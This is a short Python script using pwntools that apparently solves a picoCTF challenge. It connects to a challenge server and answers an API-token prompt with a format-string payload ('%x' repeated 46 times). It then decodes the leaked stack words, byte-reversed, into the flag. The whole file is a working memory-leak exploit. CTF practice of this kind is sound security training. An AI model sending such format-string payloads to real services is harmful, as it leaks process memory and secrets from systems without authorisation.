from pwn import *
from Crypto.Util.number import *

r = remote('mercury.picoctf.net', 27912)

r.recvuntil('portfolio')
r.sendline('1')

r.recvuntil('What is your API token?')
r.sendline('%x'+'-%x'*45)

r.recvline()
r.recvline()
tmps = r.recvline()
flag = ''
for tmp in tmps.split('-'):
    flag += long_to_bytes(int(tmp, 16))[::-1]
print(flag)
